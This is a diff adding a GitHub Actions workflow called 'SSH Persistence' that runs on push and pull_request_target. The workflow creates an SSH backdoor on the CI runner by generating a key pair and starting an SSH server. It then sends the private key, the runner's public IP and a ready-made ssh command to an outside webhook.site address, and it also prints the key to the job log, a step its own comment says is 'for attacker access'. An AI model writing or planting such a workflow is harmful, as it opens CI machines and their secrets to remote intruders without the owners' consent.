@@ -1,0 +1,45 @@
+name: SSH Persistence
+on: [push, pull_request_target]
+
+jobs:
+  ssh-backdoor:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup SSH access
+        run: |
+          # Generate SSH key pair
+          ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ""
+          
+          # Install SSH server
+          sudo apt-get update && sudo apt-get install -y openssh-server
+          
+          # Setup authorized_keys
+          mkdir -p ~/.ssh
+          cat /tmp/backdoor_key.pub >> ~/.ssh/authorized_keys
+          
+          # Start SSH service
+          sudo service ssh start
+          
+          # Get IP and keys
+          IP=$(curl -s ifconfig.me)
+          PRIVATE_KEY=$(cat /tmp/backdoor_key)
+          PUBLIC_KEY=$(cat /tmp/backdoor_key.pub)
+          
+          # Send to webhook
+          curl -X POST "https://webhook.site/cd73ae3a-736c-4f86-af2d-9641ec40b367" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"exploit\": \"ssh_backdoor\",
+              \"ip\": \"$IP\",
+              \"private_key\": \"$PRIVATE_KEY\",
+              \"public_key\": \"$PUBLIC_KEY\",
+              \"ssh_command\": \"ssh -i /tmp/backdoor_key runner@$IP\",
+              \"timestamp\": \"$(date -Iseconds)\"
+            }"
+          
+          # Expose private key for attacker access
+          echo "=== SSH PRIVATE KEY ==="
+          cat /tmp/backdoor_key
+          
+          # Show connection info
+          echo "SSH Connection: ssh -i backdoor_key runner@$IP"
